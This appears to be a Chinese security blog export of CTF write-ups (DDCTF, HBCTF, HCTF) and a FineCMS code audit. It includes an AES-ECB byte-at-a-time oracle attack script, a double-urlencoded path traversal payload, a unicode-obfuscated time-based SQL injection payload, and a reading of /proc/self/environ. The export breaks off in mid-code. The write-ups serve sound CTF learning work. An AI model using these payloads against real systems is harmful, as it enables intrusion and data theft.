<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>真签到题</p>
<h2 id="╯°□°）╯︵-┻━┻"><a href="#╯°□°）╯︵-┻━┻" class="headerlink" title="(╯°□°）╯︵ ┻━┻"></a>(╯°□°）╯︵ ┻━┻</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>(╯°□°）╯︵ ┻━┻<br>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p>
</blockquote>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><pre><code class="python">s=&#39;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&#39;
flag=&#39;&#39;
lens=len(s)
for i in range(0,lens,2):
    ch = &#39;0x&#39; + s[i:i+2]
    data = int(ch,16)
    flag += chr(data%128)

print flag
#That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</code></pre>
<blockquote>
<p>貌似是十六进制的凯撒位移？</p>
</blockquote>
<h2 id="第四扩展FS"><a href="#第四扩展FS" class="headerlink" title="第四扩展FS"></a>第四扩展FS</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。</p>
</blockquote>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>​    下载得到一个图片，图片属性得到提示<code>Pactera</code>，foremost分离出来一个压缩包，有密码，利用Pactera解压出来个file.txt，是一大段字符，词频分析得到flag。</p>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c<br>提示二：注意补齐私钥格式<br>—–BEGIN RSA PRIVATE KEY—–<br>XXXXXXX<br>—–END RSA PRIVATE KEY—–</p>
</blockquote>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>提取出的zip都不能用，在smtp包中找到了图片的base64，去解码得到一张图片，就是私钥的内容，ocr识别出来可能会有几个错的，去人眼比对，简直丧心病狂。补全之后倒入私钥就能解ssl流量了，edit–&gt;preferences—&gt;ssl。追踪一下http流得到flag。</p>
<h2 id="安全通信-AES-ECB加密攻击"><a href="#安全通信-AES-ECB加密攻击" class="headerlink" title="安全通信(AES-ECB加密攻击)"></a>安全通信(AES-ECB加密攻击)</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
<p>请通过<code>nc 116.85.48.103 5002</code>答题，<code>mission key</code>是<code>f49348cf84d390da52498077ae7137d5</code>，<code>agent id</code>随意填就可以</p>
</blockquote>
<pre><code class="python">#!/usr/bin/env python
import sys
import json
from Crypto.Cipher import AES
from Crypto import Random


def get_padding(rawstr):
    remainder = len(rawstr) % 16
    if remainder != 0:
        return &#39;\x00&#39; * (16 - remainder)
    return &#39;&#39;


def aes_encrypt(key, plaintext):
    plaintext += get_padding(plaintext)
    aes = AES.new(key, AES.MODE_ECB)
    cipher_text = aes.encrypt(plaintext).encode(&#39;hex&#39;)
    return cipher_text


def generate_hello(key, name, flag):
    message = &quot;Connection for mission: &#123;&#125;, your mission&#39;s flag is: &#123;&#125;&quot;.format(name, flag)
    return aes_encrypt(key, message)


def get_input():
    return raw_input()


def print_output(message):
    print(message)
    sys.stdout.flush()


def handle():
    print_output(&quot;Please enter mission key:&quot;)
    mission_key = get_input().rstrip()

    print_output(&quot;Please enter your Agent ID to secure communications:&quot;)
    agentid = get_input().rstrip()
    rnd = Random.new()
    session_key = rnd.read(16)

    flag = &#39;&lt;secret&gt;&#39;
    print_output(generate_hello(session_key, agentid, flag))
    while True:
        print_output(&quot;Please send some messages to be encrypted, &#39;quit&#39; to exit:&quot;)
        msg = get_input().rstrip()
        if msg == &#39;quit&#39;:
            print_output(&quot;Bye!&quot;)
            break
        enc = aes_encrypt(session_key, msg)
        print_output(enc)


if __name__ == &quot;__main__&quot;:
    handle()</code></pre>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>先来看一看题目流程：</p>
<pre><code> ~ nc 116.85.48.103 5002
[]Please enter mission key:
f49348cf84d390da52498077ae7137d5
[]Please enter your Agent ID to secure communications:
00000
[]de17b72ac25766900858e5ea3fbbb0b5bb25ca815cfebb19799cc9c3ae39e01181fe1be5cbf45a1868c8309223e47f522dd536f36ff756acae5175c824f79dcb383ddc2229cc2a03094387a253b0d8a791e25d01f1cd934d7c83e3a6b64787b1
[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
00000
88dfdc59a59ec6cfd9e5221b93bc6506
[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
Connection for mission: 0000000
de17b72ac25766900858e5ea3fbbb0b5f26fa7509409a427afa6a150bd4b01d3
[]Please send some messages to be encrypted, &#39;quit&#39; to exit:
quit
Bye!</code></pre>
<p>​    题目会给你一个mission key，输入此key，服务器返回一串密文，根据给出的题目脚本可知，密文的生成过程是：<code>Connection for mission: &#123;&#125;, your mission&#39;s flag is: &#123;&#125;</code>将第一个花括号替换成输入的agentid，第二个花括号就是我们想要的flag。</p>
<p>​    下面我们来了解一下AES加密的ECB模式：</p>
<blockquote>
<p>ECB是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理.</p>
<p><img src="/images/DDCTF/AES1.png" alt="AES"></p>
<p><img src="/images/DDCTF/AES2.png" alt="AES"></p>
</blockquote>
<p>​    也就是从第一位开始每16位位一组，使用相同的密钥进行加密，最后一组如果不够16位，使用’\x00’填充够16位。</p>
<p>​    原文开始的字符串是固定的：<code>Connection for mission:[空格]</code>，开头24位字符，如果我们补充8位，正好构成了两个块。第九位开始就是全新的一块，这一块就是我们利用的地方，我们可以通过输入16位的内容得到该内容的密文，如果两个密文块相同，那么原文也相同。我们采取从后向前的方式进行。</p>
<p>​    因为最后一组如果不足16位以’\x00’填充，我们可以通过控制输入长度使最后的一个字符多出来单独作为一个分组，这样最后一组就是<code>&#125;</code>+15个’\x00’，先构造一个<code>&#125;</code>开头的完整的块，再往后面塞补位字符，直到密文最后一组和该组相同，我们就确定了这么一个数值，使分组后余一位的数值。获取该数字的脚本如下。</p>
<pre><code class="python">from pwn import *
import time
import sys

chrs=&quot;DCTFabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!/0123456789:;&quot;
key = &quot;f49348cf84d390da52498077ae7137d5&quot;
flag = &#39;ab1af39995be81a&#39;

def go():
    global flag
    for i in range(20):
        conn = remote(&#39;116.85.48.103&#39;,5002)
        conn.recvline()
        conn.sendline(key)
        conn.recvline()
        ID = &quot;00000000&#125;&quot;
        conn.sendline(ID)
        rightstr = conn.recvline()
        checkstr = rightstr[64:96]
        compstr = rightstr[-33:-1]
        print checkstr
        print compstr
        if checkstr == compstr:
            print i 
            conn.sendline(&#39;quit&#39;)
            conn.close()
            break
        else:
            conn.close()
            ID += &quot;\x00&quot;
        sys.stdout.flush()

if __name__ == &#39;__main__&#39;:
    go()

# i=15
</code></pre>
<p>​    现在经过我们构造的原文大概这个样子-&gt; <code>Connection for m</code> <code>ission: 00000000</code> <code>&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code> <code>, your mission&#39;s</code>  <code>[空格]flag is: DDCTF&#123;xxx</code> <code>&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code> ,为了方便看我就直接分组表示了，每组16个字符。我们每向}前面插入一位，flag的倒数一位就会进入到最后的密文块，通过每一位的爆破可以得到flag的后15位（还有一个}），实际上我没发现flag大于15位，当我们继续插入一个字符时，}多出来了💺最后一组，倒数第二组的16个字符中后面15个是我们知道的，同理，我们只要比较倒数第二组密文和我们构造的密文（第三组）就好了。以此类推……</p>
<p>​    脚本写复杂了，tryflag函数和第二次sendline没必要，懒得改了 _(:з」∠)_</p>
<pre><code class="python">from pwn import *
import time
import sys

chrs=&quot;DCTFabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!/0123456789:;&quot;
key = &quot;f49348cf84d390da52498077ae7137d5&quot;
flag = &#39;ab1af39995be81a&#39;

def tryflag(ID):
    global flag
    test = &quot;Connection for mission: &quot; + ID + &quot;, your mission&#39;s flag is&quot;
    return test

def go():
    global flag

    for i in chrs:
        conn = remote(&#39;116.85.48.103&#39;,5002)
        conn.recvline()
        conn.sendline(key)
        conn.recvline()
        ID = &quot;00000000&quot;+i+flag+&quot;&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
        conn.sendline(ID)
        rightstr = conn.recvline()
        conn.recvline()
        test = tryflag(ID)
        conn.sendline(test)
        checkstr = conn.recvline()[64:96]
        if len(flag) &lt; 15:
            compstr = rightstr[-33:-1]
        elif len(flag) &gt;= 15 and len(flag) &lt; 31:
            compstr = rightstr[-65:-33]
        else:
            compstr = rightstr[-97:-65]
        print checkstr
        print compstr
        if checkstr == compstr:
            flag = i + flag
            print flag + &quot;------------------&quot;
            conn.sendline(&#39;quit&#39;)
            conn.close()
            break
        else:
            conn.close()
            #ID += &quot;\x00&quot;
        sys.stdout.flush()

if __name__ == &#39;__main__&#39;:
    while True:
        go()
#DDCTF&#123;87fa2cd38a4259c29ab1af39995be81a&#125;
</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Finecms代码审计</title>
    <url>/2017/08/27/finecms-dai-ma-shen-ji/</url>
    <content><![CDATA[<h1 id="Finecms代码审计"><a href="#Finecms代码审计" class="headerlink" title="Finecms代码审计"></a>Finecms代码审计</h1><h2 id="1-SQL语句执行"><a href="#1-SQL语句执行" class="headerlink" title="1.SQL语句执行"></a>1.SQL语句执行</h2><p><code>/finecms/dayrui/config/config.php</code>中的第37行对cookie_name进行了定义。</p>
<pre><code>$config[&#39;sess_cookie_name&#39;]                = $site[&#39;SYS_KEY&#39;].&#39;_ci_session&#39;;</code></pre>
<p>这里$site[‘SYS_KEY’]不就把SYS_KEY的值给暴露了。</p>
<p>这个SYS_KEY是安全码，有了它就能进行接下来的敏感函数的调用。</p>
<p><code>/finecms/dayrui/controllers/Api.php</code>中的115-166行的data2()函数。</p>
<pre><code class="php">public function data2() &#123;

        $data = array();

        // 安全码认证
        $auth = $this-&gt;input-&gt;get(&#39;auth&#39;, true);
        if ($auth != md5(SYS_KEY)) &#123;
            // 授权认证码不正确
            $data = array(&#39;msg&#39; =&gt; &#39;授权认证码不正确&#39;, &#39;code&#39; =&gt; 0);
        &#125; else &#123;
            // 解析数据
            $cache = &#39;&#39;;
            $param = $this-&gt;input-&gt;get(&#39;param&#39;);
            if (isset($param[&#39;cache&#39;]) &amp;&amp; $param[&#39;cache&#39;]) &#123;
                $cache = md5(dr_array2string($param));
                $data = $this-&gt;get_cache_data($cache);
            &#125;
            if (!$data) &#123;

                // list数据查询
                $data = $this-&gt;template-&gt;list_tag($param);
                $data[&#39;code&#39;] = $data[&#39;error&#39;] ? 0 : 1;
                unset($data[&#39;sql&#39;], $data[&#39;pages&#39;]);

                // 缓存数据
                $cache &amp;&amp; $this-&gt;set_cache_data($cache, $data, $param[&#39;cache&#39;]);
            &#125;
        &#125;

        // 接收参数
        $format = $this-&gt;input-&gt;get(&#39;format&#39;);
        $function = $this-&gt;input-&gt;get(&#39;function&#39;);
        if ($function) &#123;
            if (!function_exists($function)) &#123;
                $data = array(&#39;msg&#39; =&gt; fc_lang(&#39;自定义函数&#39;.$function.&#39;不存在&#39;), &#39;code&#39; =&gt; 0);
            &#125; else &#123;
                $data = $function($data);
            &#125;
        &#125;

        // 页面输出
        if ($format == &#39;php&#39;) &#123;
            print_r($data);
        &#125; elseif ($format == &#39;jsonp&#39;) &#123;
            // 自定义返回名称
            echo $this-&gt;input-&gt;get(&#39;callback&#39;, TRUE).&#39;(&#39;.$this-&gt;callback_json($data).&#39;)&#39;;
        &#125; else &#123;
            // 自定义返回名称
            echo $this-&gt;callback_json($data);
        &#125;
        exit;
    &#125;</code></pre>
<p>可以看到开始有个安全码的验证，有了之前得到的安全码，就可以利用这个函数了.</p>
<p><code>if ($auth != md5(SYS_KEY)) &#123;</code>将auth值与SYS_KEY的md5值进行比对，同则继续，异则失败。</p>
<p><code> $param = $this-&gt;input-&gt;get(&#39;param&#39;);</code>获得输入param参数值。</p>
<p><code>$data = $this-&gt;template-&gt;list_tag($param);</code>造成了漏洞。</p>
<p>定位list_tag()函数看看。</p>
<p><code>/finecms/dayrui/libraries/Template.php</code>第402-1314是list_tag函数。</p>
<p>一部分代码。</p>
<pre><code class="php">      switch ($system[&#39;action&#39;]) &#123;
            ·····················
              ·················
                  ·········
        case &#39;sql&#39;: // 直接sql查询

                if (preg_match(&#39;/sql=\&#39;(.+)\&#39;/sU&#39;, $_params, $sql)) &#123;


                    // 数据源的选择
                    $db = $this-&gt;ci-&gt;db;

                    // 替换前缀
                    $sql = str_replace(
                        array(&#39;@#S&#39;, &#39;@#&#39;),
                        array($db-&gt;dbprefix.$system[&#39;site&#39;], $db-&gt;dbprefix),
                        trim(urldecode($sql[1]))
                    );
                    if (stripos($sql, &#39;SELECT&#39;) !== 0) &#123;
                        return $this-&gt;_return($system[&#39;return&#39;], &#39;SQL语句只能是SELECT查询语句&#39;);
                    &#125;

                    $total = 0;
                    $pages = &#39;&#39;;

                    // 如存在分页条件才进行分页查询
                    if ($system[&#39;page&#39;] &amp;&amp; $system[&#39;urlrule&#39;]) &#123;
                        $page = max(1, (int)$_GET[&#39;page&#39;]);
                        $row = $this-&gt;_query(preg_replace(&#39;/select \* from/iUs&#39;, &#39;SELECT count(*) as c FROM&#39;, $sql), $system[&#39;site&#39;], $system[&#39;cache&#39;], FALSE);
                        $total = (int)$row[&#39;c&#39;];
                        $pagesize = $system[&#39;pagesize&#39;] ? $system[&#39;pagesize&#39;] : 10;
                        // 没有数据时返回空
                        if (!$total) &#123;
                            return $this-&gt;_return($system[&#39;return&#39;], &#39;没有查询到内容&#39;, $sql, 0);
                        &#125;
                        $sql.= &#39; LIMIT &#39;.$pagesize * ($page - 1).&#39;,&#39;.$pagesize;
                        $pages = $this-&gt;_get_pagination(str_replace(&#39;[page]&#39;, &#39;&#123;page&#125;&#39;, urldecode($system[&#39;urlrule&#39;])), $pagesize, $total);
                    &#125;

                    $data = $this-&gt;_query($sql, $system[&#39;site&#39;], $system[&#39;cache&#39;]);
                    $fields = NULL;

                    if ($system[&#39;module&#39;]) &#123;
                        $fields = $this-&gt;ci-&gt;module[$system[&#39;module&#39;]][&#39;field&#39;]; // 模型主表的字段
                    &#125;

                    if ($fields) &#123;
                        // 缓存查询结果
                        $name = &#39;list-action-sql-&#39;.md5($sql);
                        $cache = $this-&gt;ci-&gt;get_cache_data($name);
                        if (!$cache &amp;&amp; is_array($data)) &#123;
                            // 模型表的系统字段
                            $fields[&#39;inputtime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            $fields[&#39;updatetime&#39;] = array(&#39;fieldtype&#39; =&gt; &#39;Date&#39;);
                            // 格式化显示自定义字段内容
                            foreach ($data as $i =&gt; $t) &#123;
                                $data[$i] = $this-&gt;ci-&gt;field_format_value($fields, $t, 1);
                            &#125;
                            //$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]);
                            $cache = $system[&#39;cache&#39;] ? $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]) : $data;
                        &#125;
                        $data = $cache;
                    &#125;
                    return $this-&gt;_return($system[&#39;return&#39;], $data, $sql, $total, $pages, $pagesize);
                &#125; else &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;参数不正确，SQL语句必须用单引号包起来&#39;); // 没有查询到内容
                &#125;
                break;

            case &#39;table&#39;: // 表名查询

                if (!$system[&#39;table&#39;]) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;table参数不存在&#39;);
                &#125;

                // 默认站点参数
                $system[&#39;site&#39;] = !$system[&#39;site&#39;] ? SITE_ID : $system[&#39;site&#39;];

                $tableinfo = $this-&gt;ci-&gt;get_cache(&#39;table&#39;);
                if (!$tableinfo) &#123;
                    $this-&gt;ci-&gt;load-&gt;model(&#39;system_model&#39;);
                    $tableinfo = $this-&gt;ci-&gt;system_model-&gt;cache(); // 表结构缓存
                &#125;
                if (!$tableinfo) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;表结构缓存不存在（后台菜单-更新表结构）&#39;); // 没有表结构缓存时返回空
                &#125;

                $table = $this-&gt;ci-&gt;db-&gt;dbprefix($system[&#39;table&#39;]); // 主表
                if (!isset($tableinfo[$table][&#39;field&#39;])) &#123;
                    return $this-&gt;_return($system[&#39;return&#39;], &#39;表（&#39;.$table.&#39;）结构缓存不存在（后台菜单-更新表结构）&#39;);
                &#125;

                $where = $this-&gt;_set_where_field_prefix($where, $tableinfo[$table][&#39;field&#39;], $table); // 给条件字段加上表前缀
                $system[&#39;field&#39;] = $this-&gt;_set_select_field_prefix($system[&#39;field&#39;], $tableinfo[$table][&#39;field&#39;], $table); // 给显示字段加上表前缀
                $system[&#39;order&#39;] = $this-&gt;_set_order_field_prefix($system[&#39;order&#39;], $tableinfo[$table][&#39;field&#39;], $table); // 给排序字段加上表前缀

                $total = 0;
                $sql_from = $table; // sql的from子句</code></pre>
<p>就可以执行sql语句了。</p>
<p>POC:</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/183650354.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170827/212038658.png" alt="mark"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>HBCTF的WriteUp</title>
    <url>/2017/04/23/hbctf-de-writeup/</url>
    <content><![CDATA[<h1 id="HBCTF的WriteUp"><a href="#HBCTF的WriteUp" class="headerlink" title="HBCTF的WriteUp"></a>HBCTF的WriteUp</h1><p>1.包罗万象</p>
<p>下载下来是一个图片，图片隐写，改后缀为zip，发现里面有一个flag.txt,打开发现这个flag不对劲，好像只有一半，既然说了包罗万象那就不只一种方法，放stegsolve里左右翻一下发现另一半flag。</p>
<p>2.知己知彼</p>
<p>下载下来压缩包里有个文件BurpLoader.jar,这个小东西，好熟悉，明文攻击啊。还提示了用的好压。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170423/214337450.png" alt="mark"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF-Web的部分WP</title>
    <url>/2018/11/12/hctf-web-de-bu-fen-wp/</url>
    <content><![CDATA[<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>源码</p>
<pre><code class="php">&lt;?php
    class emmm
    &#123;
        public static function checkFile(&amp;$page)
        &#123;
            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
            if (! isset($page) || !is_string($page)) &#123;
                echo &quot;you can&#39;t see it&quot;;
                return false;
            &#125;

            if (in_array($page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
            );
            if (in_array($_page, $whitelist)) &#123;
                return true;
            &#125;
            echo &quot;you can&#39;t see it&quot;;
            return false;
        &#125;
    &#125;

    if (! empty($_REQUEST[&#39;file&#39;])
        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
    ) &#123;
        include $_REQUEST[&#39;file&#39;];
        exit;
    &#125; else &#123;
        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
    &#125;  
?&gt;</code></pre>
<p>和phpadmin的<a href="http://seaii-blog.com/index.php/2018/07/03/84.html">CVE-2018-12613</a>利用点一样，利用<code>？</code>的双重urlencode来绕过。</p>
<p>payload：</p>
<pre><code>http://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../../ffffllllaaaagggg</code></pre>
<h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><blockquote>
<p>描述</p>
<p>A script kid’s phishing website</p>
</blockquote>
<p><a href="http://www.zip有源码泄漏,在member.php中存在注入./">www.zip有源码泄漏，在member.php中存在注入。</a></p>
<p>Member.php</p>
<pre><code class="php">&lt;?php
if (!defined(&#39;IN_CRONLITE&#39;)) exit();
$islogin = 0;
if (isset($_COOKIE[&quot;islogin&quot;])) &#123;
    if ($_COOKIE[&quot;login_data&quot;]) &#123;
        $login_data = json_decode($_COOKIE[&#39;login_data&#39;], true);
        $admin_user = $login_data[&#39;admin_user&#39;];
        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
        if ($udata[&#39;username&#39;] == &#39;&#39;) &#123;
            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
        &#125;
        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
        if ($admin_pass == $login_data[&#39;admin_pass&#39;]) &#123;
            $islogin = 1;
        &#125; else &#123;
            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);
            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);
        &#125;
    &#125;
&#125;
if (isset($_SESSION[&#39;islogin&#39;])) &#123;
    if ($_SESSION[&quot;admin_user&quot;]) &#123;
        $admin_user = base64_decode($_SESSION[&#39;admin_user&#39;]);
        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);
        $admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);
        if ($admin_pass == $_SESSION[&quot;admin_pass&quot;]) &#123;
            $islogin = 1;
        &#125;
    &#125;
&#125;
?&gt;</code></pre>
<p>Safe.php</p>
<pre><code class="php">&lt;?php
function waf($string)
&#123;
    $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;;
    return preg_replace_callback($blacklist, function ($match) &#123;
        return &#39;@&#39; . $match[0] . &#39;@&#39;;
    &#125;, $string);
&#125;

function safe($string)
&#123;
    if (is_array($string)) &#123;
        foreach ($string as $key =&gt; $val) &#123;
            $string[$key] = safe($val);
        &#125;
    &#125; else &#123;
        $string = waf($string);
    &#125;
    return $string;
&#125;

foreach ($_GET as $key =&gt; $value) &#123;
    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
        $value = safe($value);
    &#125;
    $_GET[$key] = $value;
&#125;
foreach ($_POST as $key =&gt; $value) &#123;
    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
        $value = safe($value);
    &#125;
    $_POST[$key] = $value;
&#125;
foreach ($_COOKIE as $key =&gt; $value) &#123;
    if (is_string($value) &amp;&amp; !is_numeric($value)) &#123;
        $value = safe($value);
    &#125;
    $_COOKIE[$key] = $value;
&#125;
unset($cplen, $key, $value);
?&gt;</code></pre>
<p>cookie注入，unicode编码过waf。</p>
<p>payload：</p>
<pre><code>admin&#39; and (if(ascii(substr(database(),1,1))&gt;10,sleep(3),1))#
⬇️
\u0061\u0064\u006d\u0069\u006e\u0027\u0020\u0061\u006e\u0064\u0020\u0028\u0069\u0066\u0028\u0061\u0073\u0063\u0069\u0069\u0028\u0073\u0075\u0062\u0073\u0074\u0072\u0028\u0064\u0061\u0074\u0061\u0062\u0061\u0073\u0065\u0028\u0029\u002c\u0031\u002c\u0031\u0029\u0029\u003e\u0031\u0030\u002c\u0073\u006c\u0065\u0065\u0070\u0028\u0033\u0029\u002c\u0031\u0029\u0029\u0023</code></pre>
<p>写脚本盲注就ok。</p>
<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><blockquote>
<p>描述</p>
<p>only admin can get it update1/更新1: 1. fix bugs 2. attention: you may need to restart all your work as something has changed hint: 1. docker 2. only few things running on it update2/更新2: Sorry，there are still some bugs, so down temporarily. update3/更新3: fixed bug</p>
</blockquote>
<p>软连接读源码+season伪造</p>
<p>读<code>/proc/self/environ</code>得到uwsgi配置文件。</p>
<pre><code>UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi
SUPERVISOR_GROUP_NAME=uwsgi
HOSTNAME=323a960bcc1a
SHLVL=0
PYTHON_PIP_VERSION=18.1
HOME=/root
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
NGINX_MAX_UPLOAD=0
UWSGI_PROCESSES=16
STATIC_URL=/static
UWSGI_CHEAPER=2
NGINX_VERSION=1.13.12-1~stretch
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NJS_VERSION=1.13.12.0.2.0-1~stretch
LANG=C.UTF-8
SUPERVISOR_ENABLED=1
PYTHON_VERSION=3.6.6
NGINX_WORKER_PROCESSES=auto
SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock
SUPERVISOR_PROCESS_NAME=uwsgi
LISTEN_PORT=80STATIC_INDEX=0
PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
STATIC_PATH=/app/static
PYTHONPATH=/app
UWSGI_RELOADS=</code></pre>
<p>再去读<code>UWSGI_INI</code></p>
<pre><code>[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app</code></pre>
<p>去读文件<code>app/hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main.py </code></p>
<p>得到源码：</p>
<pre><code class="python"># -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config[&#39;SECRET_KEY&#39;] = str(random.random()*100)
app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;
app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 100 * 1024
ALLOWED_EXTENSIONS = set([&#39;zip&#39;])

def allowed_file(filename):
    return &#39;.&#39; in filename and \
           filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
def index():
    error = request.args.get(&#39;error&#39;, &#39;&#39;)
    if(error == &#39;1&#39;):
        session.pop(&#39;username&#39;, None)
        return render_template(&#39;index.html&#39;, forbidden=1)

    if &#39;username&#39; in session:
        return render_template(&#39;index.html&#39;, user=session[&#39;username&#39;], flag=flag.flag)
    else:
        return render_template(&#39;index.html&#39;)


@app.route(&#39;/login&#39;, methods=[&#39;POST&#39;])
def login():
    username=request.form[&#39;username&#39;]

    password=request.form[&#39;password&#39;]
    if request.method == &#39;POST&#39; and username != &#39;&#39; and password != &#39;&#39;:
        if(username == &#39;admin&#39;):
            return redirect(url_for(&#39;index&#39;,error=1))
        session[&#39;username&#39;] = username
    return redirect(url_for(&#39;index&#39;))


@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])
def logout():
    session.pop(&#39;username&#39;, None)
    return redirect(url_for(&#39;index&#39;))

@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
def upload_file():
    if &#39;the_file&#39; not in request.files:
        return redirect(url_for(&#39;index&#39;))
    file = request.files[&#39;the_file&#39;]
    if file.filename == &#39;&#39;:
        return redirect(url_for(&#39;index&#39;))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)
        if(os.path.exists(file_save_path)):
            return &#39;This file already exists&#39;
        file.save(file_save_path)
    else:
        return &#39;This file is not a zipfile&#39;


    try:
        extract_path = file_save_path + &#39;_&#39;
        os.system(&#39;unzip -n &#39; + file_save_path + &#39; -d &#39;+ extract_path)
        read_obj = os.popen(&#39;cat &#39; + extract_path + &#39;/*&#39;)
        file = read_obj.read()
        read_obj.close()
      os.system(&#39;rm -rf &#39; + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
